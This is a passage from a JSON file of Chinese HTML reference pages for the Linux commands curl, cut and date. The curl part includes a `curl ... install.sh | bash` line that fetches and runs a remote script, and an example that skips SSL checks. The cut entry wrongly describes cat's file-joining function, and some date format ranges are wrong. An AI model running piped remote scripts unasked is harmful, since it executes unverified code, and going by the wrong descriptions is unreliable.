class=\"hljs-type\">text</span>/html; charset=UTF<span class=\"hljs-number\">-8</span>\n<span class=\"hljs-keyword\">Connection</span>: keep-alive\nVary: Accept-<span class=\"hljs-keyword\">Encoding</span>\nX-Pingback: http://wangchujiang.com/xmlrpc.php\n</code></pre>\n<p><strong>get请求</strong></p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">curl</span> <span class=\"hljs-string\">\"http://www.wangchujiang.com\"</span>    <span class=\"hljs-comment\"># 如果这里的URL指向的是一个文件或者一幅图都可以直接下载到本地</span>\n<span class=\"hljs-built_in\">curl</span> <span class=\"hljs-literal\">-i</span> <span class=\"hljs-string\">\"http://www.wangchujiang.com\"</span> <span class=\"hljs-comment\"># 显示全部信息</span>\n<span class=\"hljs-built_in\">curl</span> <span class=\"hljs-literal\">-l</span> <span class=\"hljs-string\">\"http://www.wangchujiang.com\"</span> <span class=\"hljs-comment\"># 只显示头部信息</span>\n<span class=\"hljs-built_in\">curl</span> <span class=\"hljs-literal\">-v</span> <span class=\"hljs-string\">\"http://www.wangchujiang.com\"</span> <span class=\"hljs-comment\"># 显示get请求全过程解析</span>\n</code></pre>\n<p><strong>post请求</strong></p>\n<pre><code class=\"language-shell\"><span class=\"hljs-variable\">$</span> <span class=\"hljs-built_in\">curl</span> <span class=\"hljs-literal\">-d</span> <span class=\"hljs-string\">\"param1=value1&amp;param2=value2\"</span> <span class=\"hljs-string\">\"http://www.wangchujiang.com/login\"</span>\n\n<span class=\"hljs-built_in\">curl</span> <span class=\"hljs-literal\">-d</span><span class=\"hljs-string\">'login=emma＆password=123'</span> <span class=\"hljs-literal\">-X</span> POST https://wangchujiang.com/login\n<span class=\"hljs-comment\"># 或者</span>\n<span class=\"hljs-variable\">$</span> <span class=\"hljs-built_in\">curl</span> <span class=\"hljs-literal\">-d</span> <span class=\"hljs-string\">'login=emma'</span> <span class=\"hljs-literal\">-d</span> <span class=\"hljs-string\">'password=123'</span> <span class=\"hljs-literal\">-X</span> POST  https://wangchujiang.com/login\n</code></pre>\n<p><code>--data-urlencode</code> 参数等同于 <code>-d</code>，发送 <code>POST</code> 请求的数据体，区别在于会自动将发送的数据进行 <code>URL</code> 编码。</p>\n<pre><code class=\"language-shell\">curl --data-urlencode <span class=\"hljs-string\">'comment=hello world'</span> https:<span class=\"hljs-regexp\">//</span>wangchujiang.com/login\n<span class=\"hljs-comment\"># 上面代码中，发送的数据hello world之间有一个空格，需要进行 URL 编码。</span>\n</code></pre>\n<p><strong>读取本地文本文件的数据，向服务器发送</strong></p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">curl</span> -d <span class=\"hljs-string\">'<span class=\"hljs-variable\">@data</span>.txt'</span> https://wangchujiang.com/upload\n<span class=\"hljs-comment\"># 读取data.txt文件的内容，作为数据体向服务器发送。</span>\n</code></pre>\n<p><strong>json格式的post请求</strong></p>\n<pre><code class=\"language-shell\">curl -l -H <span class=\"hljs-string\">\"Content-type: application/json\"</span> -X POST -d <span class=\"hljs-string\">'{\"</span>phone<span class=\"hljs-string\">\":\"</span><span class=\"hljs-number\">13521389587</span><span class=\"hljs-string\">\",\"</span>password<span class=\"hljs-string\">\":\"</span>test<span class=\"hljs-string\">\"}'</span> http:<span class=\"hljs-comment\">//wangchujiang.com/apis/users.json</span>\n</code></pre>\n<p><strong>向服务器发送 Cookie</strong></p>\n<p>使用<code>--cookie \"COKKIES\"</code>选项来指定cookie，多个cookie使用分号分隔：</p>\n<pre><code class=\"language-shell\">curl http:<span class=\"hljs-regexp\">//</span>wangchujiang.com --cookie <span class=\"hljs-string\">\"user=root;pass=123456\"</span>\n</code></pre>\n<p>将cookie另存为一个文件，使用<code>--cookie-jar</code>选项：</p>\n<pre><code class=\"language-shell\">curl <span class=\"hljs-built_in\">URL</span> <span class=\"hljs-comment\">--cookie-jar cookie_file</span>\n</code></pre>\n<p><code>-b</code> 参数用来向服务器发送 Cookie。</p>\n<pre><code class=\"language-shell\">curl -b <span class=\"hljs-string\">'foo=bar'</span> https:<span class=\"hljs-regexp\">//</span>taobao.com\n<span class=\"hljs-comment\"># 上面命令会生成一个标头Cookie: foo=bar，向服务器发送一个名为foo、值为bar的 Cookie。</span>\n</code></pre>\n<pre><code class=\"language-shell\">curl -b <span class=\"hljs-string\">'foo1=bar'</span> -b <span class=\"hljs-string\">'foo2=baz'</span> https:<span class=\"hljs-regexp\">//</span>taobao.com\n<span class=\"hljs-comment\"># 上面命令发送两个 Cookie。</span>\n\n```shell\ncurl -b cookies.txt https:<span class=\"hljs-regexp\">//</span>www.taobao.com\n<span class=\"hljs-comment\"># 上面命令读取本地文件 cookies.txt，里面是服务器设置的 Cookie（参见-c参数），将其发送到服务器。</span>\n</code></pre>\n<p><strong>Cookie 写入一个文件</strong></p>\n<pre><code class=\"language-shell\">curl -c cookies.txt https:<span class=\"hljs-regexp\">//</span>www.taobao.com\n<span class=\"hljs-comment\"># 上面命令将服务器的 HTTP 回应所设置 Cookie 写入文本文件cookies.txt。</span>\n</code></pre>\n<p><strong>请求的来源</strong></p>\n<p><code>-e</code> 参数用来设置 <code>HTTP</code> 的标头 <code>Referer</code>，表示请求的来源。</p>\n<pre><code class=\"language-shell\">curl -e 'https://taobao.com?q=example' https:<span class=\"hljs-comment\">//www.example.com</span>\n<span class=\"hljs-meta\"># 上面命令将Referer标头设为 https:<span class=\"hljs-comment\">//taobao.com?q=example。</span></span>\n</code></pre>\n<p><code>-H</code> 参数可以通过直接添加标头 <code>Referer</code>，达到同样效果。</p>\n<pre><code class=\"language-shell\">curl -H <span class=\"hljs-string\">'Referer: https://taobao.com?q=example'</span> https:<span class=\"hljs-regexp\">//</span>www.example.com\n</code></pre>\n<p><strong>上传二进制文件</strong></p>\n<p><code>-F</code> 参数用来向服务器上传二进制文件。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">curl</span> -F <span class=\"hljs-string\">'file=<span class=\"hljs-variable\">@photo</span>.png'</span> https://taobao.com/profile\n<span class=\"hljs-comment\"># 上面命令会给 HTTP 请求加上标头 Content-Type: multipart/form-data ，然后将文件photo.png作为file字段上传。</span>\n</code></pre>\n<p><code>-F</code> 参数可以指定 <code>MIME</code> 类型。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">curl</span> -F <span class=\"hljs-string\">'file=<span class=\"hljs-variable\">@photo</span>.png;type=image/png'</span> https://taobao.com/profile\n<span class=\"hljs-comment\"># 上面命令指定 MIME 类型为image/png，否则 curl 会把 MIME 类型设为 application/octet-stream。</span>\n</code></pre>\n<p><code>-F</code> 参数也可以指定文件名。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">curl</span> -F <span class=\"hljs-string\">'file=<span class=\"hljs-variable\">@photo</span>.png;filename=me.png'</span> https://taobao.com/profile\n<span class=\"hljs-comment\"># 上面命令中，原始文件名为photo.png，但是服务器接收到的文件名为me.png。</span>\n</code></pre>\n<p><strong>设置请求头</strong></p>\n<p><code>-H</code> 参数添加 <code>HTTP</code> 请求的标头。</p>\n<pre><code class=\"language-shell\">curl -<span class=\"hljs-keyword\">H</span> 'Accept-Language: <span class=\"hljs-keyword\">en</span>-<span class=\"hljs-keyword\">US</span>' https:<span class=\"hljs-comment\">//google.com</span>\n# 上面命令添加 HTTP 标头 Accept-Language: <span class=\"hljs-keyword\">en</span>-<span class=\"hljs-keyword\">US</span>。\n</code></pre>\n<pre><code class=\"language-shell\">curl -H <span class=\"hljs-string\">'Accept-Language: en-US'</span> -H <span class=\"hljs-string\">'Secret-Message: xyzzy'</span> https:<span class=\"hljs-regexp\">//g</span>oogle.com\n<span class=\"hljs-comment\"># 上面命令添加两个 HTTP 标头。</span>\n</code></pre>\n<pre><code class=\"language-shell\">curl -d '{<span class=\"hljs-string\">\"login\"</span>: <span class=\"hljs-string\">\"emma\"</span>, <span class=\"hljs-string\">\"pass\"</span>: <span class=\"hljs-string\">\"123\"</span>}' -H <span class=\"hljs-symbol\">'Content</span>-<span class=\"hljs-keyword\">Type</span>: application/json' https://google.com/login\n# 上面命令添加 HTTP 请求的标头是 Content-<span class=\"hljs-keyword\">Type</span>: application/json，然后用 -d 参数发送 JSON 数据。\n</code></pre>\n<p><strong>跳过 SSL 检测</strong></p>\n<pre><code class=\"language-shell\">curl -k https:<span class=\"hljs-regexp\">//</span>www.example.com\n<span class=\"hljs-comment\"># 上面命令不会检查服务器的 SSL 证书是否正确。</span>\n</code></pre>\n<p><strong>请求跟随服务器的重定向</strong></p>\n<p><code>-L</code> 参数会让 <code>HTTP</code> 请求跟随服务器的重定向。<code>curl</code> 默认不跟随重定向。</p>\n<pre><code class=\"language-shell\">curl -L -d <span class=\"hljs-string\">'tweet=hi'</span> https:<span class=\"hljs-regexp\">//</span>api.example.com/tweet\n</code></pre>\n<p><strong>调试参数</strong></p>\n<p><code>-v</code> 参数输出通信的整个过程，用于调试。</p>\n<pre><code class=\"language-shell\">curl -v https:<span class=\"hljs-regexp\">//</span>www.example.com\n<span class=\"hljs-comment\"># --trace参数也可以用于调试，还会输出原始的二进制数据。</span>\n</code></pre>\n<pre><code class=\"language-shell\">$ curl --trace - https:<span class=\"hljs-regexp\">//</span>www.example.com\n</code></pre>\n<p><strong>获取本机外网ip</strong></p>\n<pre><code class=\"language-shell\">curl ipecho.<span class=\"hljs-built_in\">net</span>/plain\n</code></pre>\n<p><strong>使用 curl 测试网站加载速度</strong></p>\n<p>命令有一个鲜为人知的选项，<code>-w</code>，该选项在请求结束之后打印本次请求的统计数据到标准输出。</p>\n<p>首先，我们定义控制打印行为的格式化字符串。新建文本文件 <code>fmt.txt</code>，并填入下面的内容：</p>\n<pre><code class=\"language-ruby\"><span class=\"hljs-symbol\">\\n</span>\nResponse Time for: %{url_effective}<span class=\"hljs-symbol\">\\n</span><span class=\"hljs-symbol\">\\n</span>\nDNS Lookup Time:<span class=\"hljs-symbol\">\\t</span><span class=\"hljs-symbol\">\\t</span>%{time_namelookup}s<span class=\"hljs-symbol\">\\n</span>\nRedirection Time:<span class=\"hljs-symbol\">\\t</span><span class=\"hljs-symbol\">\\t</span>%{time_redirect}s<span class=\"hljs-symbol\">\\n</span>\nConnection Time:<span class=\"hljs-symbol\">\\t</span><span class=\"hljs-symbol\">\\t</span>%{time_connect}s<span class=\"hljs-symbol\">\\n</span>\nApp Connection Time:<span class=\"hljs-symbol\">\\t</span><span class=\"hljs-symbol\">\\t</span>%{time_appconnect}s<span class=\"hljs-symbol\">\\n</span>\nPre-transfer Time:<span class=\"hljs-symbol\">\\t</span><span class=\"hljs-symbol\">\\t</span>%{time_pretransfer}s<span class=\"hljs-symbol\">\\n</span>\nStart-transfer Time:<span class=\"hljs-symbol\">\\t</span><span class=\"hljs-symbol\">\\t</span>%{time_starttransfer}s<span class=\"hljs-symbol\">\\n</span><span class=\"hljs-symbol\">\\n</span>\nTotal Time:<span class=\"hljs-symbol\">\\t</span><span class=\"hljs-symbol\">\\t</span><span class=\"hljs-symbol\">\\t</span>%{time_total}s<span class=\"hljs-symbol\">\\n</span>\n</code></pre>\n<p>curl 提供了很多置换变量，可以在格式化字符串中通过 <code>%{var}</code> 的形式使用。完整的变量列表可以在 <code>curl</code> 的 <code>manpage</code> 中查看。简单介绍一下我们使用的这几个变量：</p>\n<ul>\n<li><code>url_effective</code>: 执行完地址重定向之后的最终 URL；</li>\n<li><code>time_namelookup</code>: 从请求开始至完成名称解析所花的时间，单位为秒，下同；</li>\n<li><code>time_redirect</code>: 执行所有重定向所花的时间；</li>\n<li><code>time_connect</code>: 从请求开始至建立 TCP 连接所花的时间；</li>\n<li><code>time_appconnect</code>: 从请求开始至完成 SSL/SSH 握手所花的时间；</li>\n<li><code>time_pretransfer</code>: 从请求开始至服务器准备传送文件所花的时间，包含了传送协商时间；</li>\n<li><code>time_starttransfer</code>: 从请求开始至服务器准备传送第一个字节所花的时间；</li>\n<li><code>time_total</code>: 完整耗时。</li>\n</ul>\n<p>然后执行请求，通过 @filename 指定保存了格式化字符串的文件：</p>\n<pre><code class=\"language-shell\">$ curl -L -s -w @fmt.txt -o <span class=\"hljs-regexp\">/dev/</span>null http:<span class=\"hljs-regexp\">//</span>www.google.com\n</code></pre>\n<p>输出：</p>\n<pre><code class=\"language-c\"><span class=\"hljs-attribute\">Response</span> Time for: http://www.google.co.jp/?gfe_rd=cr&amp;dcr=<span class=\"hljs-number\">0</span>&amp;ei=cjIaWpTkHeiQ8QfnxYzoBA\n\n<span class=\"hljs-attribute\">DNS</span> Lookup Time:        <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">000038</span>s\n<span class=\"hljs-attribute\">Redirection</span> Time:       <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">207271</span>s\n<span class=\"hljs-attribute\">Connection</span> Time:        <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">000039</span>s\n<span class=\"hljs-attribute\">App</span> Connection Time:    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">000039</span>s\n<span class=\"hljs-attribute\">Pre</span>-transfer Time:      <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">000067</span>s\n<span class=\"hljs-attribute\">Start</span>-transfer Time:    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">260115</span>s\n\n<span class=\"hljs-attribute\">Total</span> Time:             <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">467691</span>s\n</code></pre>\n<h3 id=\"要求返回是压缩的状态\">要求返回是压缩的状态</h3>\n<pre><code class=\"language-shell\">▶ curl --compressed -o- -L <span class=\"hljs-symbol\">https:</span>/<span class=\"hljs-regexp\">/yarnpkg.com/install</span>.sh | bash\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n<span class=\"hljs-number\">100</span>    <span class=\"hljs-number\">54</span>  <span class=\"hljs-number\">100</span>    <span class=\"hljs-number\">54</span>    0     0     <span class=\"hljs-number\">42</span>      0  0<span class=\"hljs-symbol\">:</span>00<span class=\"hljs-symbol\">:</span>01  0<span class=\"hljs-symbol\">:</span>00<span class=\"hljs-symbol\">:</span>01 --<span class=\"hljs-symbol\">:--</span><span class=\"hljs-symbol\">:--</span>    <span class=\"hljs-number\">42</span>\n<span class=\"hljs-number\">100</span>  <span class=\"hljs-number\">2341</span>  <span class=\"hljs-number\">100</span>  <span class=\"hljs-number\">2341</span>    0     0   <span class=\"hljs-number\">1202</span>      0  0<span class=\"hljs-symbol\">:</span>00<span class=\"hljs-symbol\">:</span>01  0<span class=\"hljs-symbol\">:</span>00<span class=\"hljs-symbol\">:</span>01 --<span class=\"hljs-symbol\">:--</span><span class=\"hljs-symbol\">:--</span>  <span class=\"hljs-number\">9289</span>\nInstalling Yarn!\n&gt; Downloading tarball...\n\n[<span class=\"hljs-number\">1</span>/<span class=\"hljs-number\">2</span>]: <span class=\"hljs-symbol\">https:</span>/<span class=\"hljs-regexp\">/yarnpkg.com/latest</span>.tar.gz --&gt; /var/folders/j7/<span class=\"hljs-number\">3</span>xly5sk567s65ny5dnr__3b80000gn/T/yarn.tar.gz.XXXXXXXXXX.<span class=\"hljs-number\">9</span>hJsBsrA\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n<span class=\"hljs-number\">100</span>    <span class=\"hljs-number\">57</span>  <span class=\"hljs-number\">100</span>    <span class=\"hljs-number\">57</span>    0     0     <span class=\"hljs-number\">72</span>      0 --<span class=\"hljs-symbol\">:--</span><span class=\"hljs-symbol\">:--</span> --<span class=\"hljs-symbol\">:--</span><span class=\"hljs-symbol\">:--</span> --<span class=\"hljs-symbol\">:--</span><span class=\"hljs-symbol\">:--</span>    <span class=\"hljs-number\">72</span>\n<span class=\"hljs-number\">100</span>    <span class=\"hljs-number\">93</span>  <span class=\"hljs-number\">100</span>    <span class=\"hljs-number\">93</span>    0     0     <span class=\"hljs-number\">63</span>      0  0<span class=\"hljs-symbol\">:</span>00<span class=\"hljs-symbol\">:</span>01  0<span class=\"hljs-symbol\">:</span>00<span class=\"hljs-symbol\">:</span>01 --<span class=\"hljs-symbol\">:--</span><span class=\"hljs-symbol\">:--</span>    <span class=\"hljs-number\">63</span>\n<span class=\"hljs-number\">100</span>   <span class=\"hljs-number\">643</span>  <span class=\"hljs-number\">100</span>   <span class=\"hljs-number\">643</span>    0     0    <span class=\"hljs-number\">248</span>      0  0<span class=\"hljs-symbol\">:</span>00<span class=\"hljs-symbol\">:</span>02  0<span class=\"hljs-symbol\">:</span>00<span class=\"hljs-symbol\">:</span>02 --<span class=\"hljs-symbol\">:--</span><span class=\"hljs-symbol\">:--</span>   <span class=\"hljs-number\">707</span>\n<span class=\"hljs-number\">100</span> <span class=\"hljs-number\">1215</span>k  <span class=\"hljs-number\">100</span> <span class=\"hljs-number\">1215</span>k    0     0   <span class=\"hljs-number\">153</span>k      0  0<span class=\"hljs-symbol\">:</span>00<span class=\"hljs-symbol\">:</span>07  0<span class=\"hljs-symbol\">:</span>00<span class=\"hljs-symbol\">:</span>07 --<span class=\"hljs-symbol\">:--</span><span class=\"hljs-symbol\">:--</span>  <span class=\"hljs-number\">305</span>k\n\n[<span class=\"hljs-number\">2</span>/<span class=\"hljs-number\">2</span>]: <span class=\"hljs-symbol\">https:</span>/<span class=\"hljs-regexp\">/yarnpkg.com/latest</span>.tar.gz.asc --&gt; /var/folders/j7/<span class=\"hljs-number\">3</span>xly5sk567s65ny5dnr__3b80000gn/T/yarn.tar.gz.XXXXXXXXXX.<span class=\"hljs-number\">9</span>hJsBsrA.asc\n<span class=\"hljs-number\">100</span>    <span class=\"hljs-number\">61</span>  <span class=\"hljs-number\">100</span>    <span class=\"hljs-number\">61</span>    0     0    <span class=\"hljs-number\">356</span>      0 --<span class=\"hljs-symbol\">:--</span><span class=\"hljs-symbol\">:--</span> --<span class=\"hljs-symbol\">:--</span><span class=\"hljs-symbol\">:--</span> --<span class=\"hljs-symbol\">:--</span><span class=\"hljs-symbol\">:--</span>   <span class=\"hljs-number\">356</span>\n<span class=\"hljs-number\">100</span>    <span class=\"hljs-number\">97</span>  <span class=\"hljs-number\">100</span>    <span class=\"hljs-number\">97</span>    0     0    <span class=\"hljs-number\">325</span>      0 --<span class=\"hljs-symbol\">:--</span><span class=\"hljs-symbol\">:--</span> --<span class=\"hljs-symbol\">:--</span><span class=\"hljs-symbol\">:--</span> --<span class=\"hljs-symbol\">:--</span><span class=\"hljs-symbol\">:--</span>   <span class=\"hljs-number\">325</span>\n<span class=\"hljs-number\">100</span>   <span class=\"hljs-number\">647</span>  <span class=\"hljs-number\">100</span>   <span class=\"hljs-number\">647</span>    0     0   <span class=\"hljs-number\">1283</span>      0 --<span class=\"hljs-symbol\">:--</span><span class=\"hljs-symbol\">:--</span> --<span class=\"hljs-symbol\">:--</span><span class=\"hljs-symbol\">:--</span> --<span class=\"hljs-symbol\">:--</span><span class=\"hljs-symbol\">:--</span>  <span class=\"hljs-number\">1283</span>\n<span class=\"hljs-number\">100</span>   <span class=\"hljs-number\">832</span>  <span class=\"hljs-number\">100</span>   <span class=\"hljs-number\">832</span>    0     0   <span class=\"hljs-number\">1107</span>      0 --<span class=\"hljs-symbol\">:--</span><span class=\"hljs-symbol\">:--</span> --<span class=\"hljs-symbol\">:--</span><span class=\"hljs-symbol\">:--</span> --<span class=\"hljs-symbol\">:--</span><span class=\"hljs-symbol\">:--</span>  <span class=\"hljs-number\">812</span>k\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "cut",
        "des": "连接文件并打印到标准输出设备上",
        "body": "<h1 id=\"cut\">cut</h1>\n<p>连接文件并打印到标准输出设备上</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>cut 命令</strong> 用来显示行中的指定部分，删除文件中指定字段。cut 经常用来显示文件的内容，类似于 type 命令。</p>\n<p>说明：该命令有两项功能，其一是用来显示文件的内容，它依次读取由参数 file 所指 明的文件，将它们的内容输出到标准输出上；其二是连接两个或多个文件，如<code>cut fl f2 &gt; f3</code>将把文件 fl 和 f2 的内容合并起来，然后通过输出重定向符“&gt;”的作用，将它们放入文件 f3 中。</p>\n<p>当文件较大时，文本在屏幕上迅速闪过（滚屏），用户往往看不清所显示的内容。因此，一般用 more 等命令分屏显示。为了控制滚屏，可以按 Ctrl+S 键，停止滚屏；按 Ctrl+Q 键可以恢复滚屏。按 Ctrl+C（中断）键可以终止该命令的执行，并且返回 Shell 提示符状态。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">cut</span>（选项）（参数）\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-b：仅显示行中指定直接范围的内容；</span>\n<span class=\"hljs-deletion\">-c：仅显示行中指定范围的字符；</span>\n<span class=\"hljs-deletion\">-d：指定字段的分隔符，默认的字段分隔符为“TAB”；</span>\n<span class=\"hljs-deletion\">-f：显示指定字段的内容；</span>\n<span class=\"hljs-deletion\">-n：与“-b”选项连用，不分割多字节字符；</span>\n<span class=\"hljs-deletion\">--complement：补足被选择的字节、字符或字段；</span>\n<span class=\"hljs-deletion\">--out-delimiter= 字段分隔符：指定输出内容是的字段分割符；</span>\n<span class=\"hljs-deletion\">--help：显示指令的帮助信息；</span>\n<span class=\"hljs-deletion\">--version：显示指令的版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定要进行内容过滤的文件。</p>\n<h3 id=\"实例\">实例</h3>\n<p>例如有一个学生报表信息，包含 No、Name、Mark、Percent：</p>\n<pre><code class=\"language-shell\">[root@localhost text]# <span class=\"hljs-keyword\">cat</span> <span class=\"hljs-keyword\">test</span>.txt\n<span class=\"hljs-keyword\">No</span> Name <span class=\"hljs-keyword\">Mark</span> Percent\n01 tom 69 91\n02 jack 71 87\n03 alex 68 98\n</code></pre>\n<p>使用  <strong>-f</strong>  选项提取指定字段（这里的 f 参数可以简单记忆为 <code>--fields</code>的缩写）：</p>\n<pre><code class=\"language-shell\">[root@localhost <span class=\"hljs-built_in\">text</span>]<span class=\"hljs-comment\"># cut -f 1 test.txt</span>\nNo\n<span class=\"hljs-number\">01</span>\n<span class=\"hljs-number\">02</span>\n<span class=\"hljs-number\">03</span>\n</code></pre>\n<pre><code class=\"language-shell\">[root@localhost <span class=\"hljs-built_in\">text</span>]<span class=\"hljs-meta\"># cut -f2,3 test.txt</span>\n<span class=\"hljs-built_in\">Name</span> Mark\ntom <span class=\"hljs-number\">69</span>\njack <span class=\"hljs-number\">71</span>\nalex <span class=\"hljs-number\">68</span>\n</code></pre>\n<p> <strong>--complement</strong>  选项提取指定字段之外的列（打印除了第二列之外的列）：</p>\n<pre><code class=\"language-shell\">[root@localhost text]<span class=\"hljs-comment\"># cut -f2 --complement test.txt</span>\nNo Mark Percent\n01<span class=\"hljs-number\"> 69 </span>91\n02<span class=\"hljs-number\"> 71 </span>87\n03<span class=\"hljs-number\"> 68 </span>98\n</code></pre>\n<p>使用  <strong>-d</strong>  选项指定字段分隔符：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-title\">@localhost</span> text]# cat test<span class=\"hljs-number\">2</span>.txt\nNo<span class=\"hljs-comment\">;Name;Mark;Percent</span>\n<span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;tom;69;91</span>\n<span class=\"hljs-number\">02</span><span class=\"hljs-comment\">;jack;71;87</span>\n<span class=\"hljs-number\">03</span><span class=\"hljs-comment\">;alex;68;98</span>\n</code></pre>\n<pre><code class=\"language-shell\">[root@localhost <span class=\"hljs-built_in\">text</span>]<span class=\"hljs-meta\"># cut -f2 -d<span class=\"hljs-string\">\";\"</span> test2.txt</span>\n<span class=\"hljs-built_in\">Name</span>\ntom\njack\nalex\n</code></pre>\n<h3 id=\"指定字段的字符或者字节范围\">指定字段的字符或者字节范围</h3>\n<p>cut 命令可以将一串字符作为列来显示，字符字段的记法：</p>\n<ul>\n<li><strong>N-</strong> ：从第 N 个字节、字符、字段到结尾；</li>\n<li><strong>N-M</strong> ：从第 N 个字节、字符、字段到第 M 个（包括 M 在内）字节、字符、字段；</li>\n<li><strong>-M</strong> ：从第 1 个字节、字符、字段到第 M 个（包括 M 在内）字节、字符、字段。</li>\n</ul>\n<p>上面是记法，结合下面选项将摸个范围的字节、字符指定为字段：</p>\n<ul>\n<li><strong>-b</strong>  表示字节；</li>\n<li><strong>-c</strong>  表示字符；</li>\n<li><strong>-f</strong>  表示定义字段。</li>\n</ul>\n<p><strong>示例</strong></p>\n<pre><code class=\"language-shell\">[root@localhost <span class=\"hljs-built_in\">text</span>]<span class=\"hljs-comment\"># cat test.txt</span>\nabcdefghijklmnopqrstuvwxyz\nabcdefghijklmnopqrstuvwxyz\nabcdefghijklmnopqrstuvwxyz\nabcdefghijklmnopqrstuvwxyz\nabcdefghijklmnopqrstuvwxyz\n</code></pre>\n<p>打印第 1 个到第 3 个字符：</p>\n<pre><code class=\"language-shell\">[root@localhost text]# cut -c1-<span class=\"hljs-number\">3</span> test.txt\n<span class=\"hljs-keyword\">abc</span>\n<span class=\"hljs-keyword\">abc</span>\n<span class=\"hljs-keyword\">abc</span>\n<span class=\"hljs-keyword\">abc</span>\n<span class=\"hljs-keyword\">abc</span>\n</code></pre>\n<p>打印前 2 个字符：</p>\n<pre><code class=\"language-shell\">[root@localhost text]# cut -<span class=\"hljs-keyword\">c</span>-<span class=\"hljs-number\">2</span> test.txt\n<span class=\"hljs-keyword\">ab</span>\n<span class=\"hljs-keyword\">ab</span>\n<span class=\"hljs-keyword\">ab</span>\n<span class=\"hljs-keyword\">ab</span>\n<span class=\"hljs-keyword\">ab</span>\n</code></pre>\n<p>打印从第 5 个字符开始到结尾：</p>\n<pre><code class=\"language-shell\">[root@localhost <span class=\"hljs-built_in\">text</span>]<span class=\"hljs-comment\"># cut -c5- test.txt</span>\nefghijklmnopqrstuvwxyz\nefghijklmnopqrstuvwxyz\nefghijklmnopqrstuvwxyz\nefghijklmnopqrstuvwxyz\nefghijklmnopqrstuvwxyz\n</code></pre>\n<!-- Linux 命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "date",
        "des": "显示或设置系统时间与日期",
        "body": "<h1 id=\"date\">date</h1>\n<p>显示或设置系统时间与日期</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">date <span class=\"hljs-comment\">[OPTION]</span>... <span class=\"hljs-comment\">[+FORMAT]</span>\ndate <span class=\"hljs-comment\">[-u|--utc|--universal]</span> <span class=\"hljs-comment\">[MMDDhhmm<span class=\"hljs-comment\">[<span class=\"hljs-comment\">[CC]</span>YY]</span><span class=\"hljs-comment\">[.ss]</span>]</span>\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>转换时间到选定的格式，默认为当前。</li>\n<li>设置系统时间。</li>\n</ul>\n<h2 id=\"参数\">参数</h2>\n<p>format：输出的时间格式。</p>\n<pre><code class=\"language-shell\">format可用的转义序列如下：\n<span class=\"hljs-tag\">\n%</span>%      百分号\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">a</span></span>      当地缩写的工作日名称（例如，Sun）\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">A</span></span>      当地完整的工作日名称（例如，Sunday）\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">b</span></span>      当地缩写的月份名称（例如，Jan）\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">B</span></span>      当地完整的月份名称（例如，January）\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">c</span></span>      当地的日期和时间（例如，Thu Mar  3 23:05:25 2005）\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">C</span></span>      世纪，和%Y类似，但是省略后两位（例如，20）\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">d</span></span>      一月中的一天（例如，01）\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">D</span></span>      日期，等价于%m/%d/%y\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">e</span></span>      一月中的一天，格式使用空格填充，等价于%_d\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">F</span></span>      完整的日期；等价于%+4Y-%m-%d\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">g</span></span>      ISO标准计数周的年份的最后两位数字\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">G</span></span>      ISO标准计数周的年份，通常只对%V有用\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">h</span></span>      等价于%b\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">H</span></span>      小时，范围（00..23）\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">I</span></span>      小时，范围（00..23）\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">j</span></span>      一年中的一天，范围（001..366）\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">k</span></span>      小时，使用空格填充，范围（0..23），等价于%_H\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">l</span></span>      小时，使用空格填充，范围（1..12），等价于%_I\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">m</span></span>      月，范围（01..12）\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">M</span></span>      分钟，范围（00..59）\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">n</span></span>      换行符\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">N</span></span>      纳秒，范围（000000000..000000000）\n<span class=\"hljs-tag\">%<span 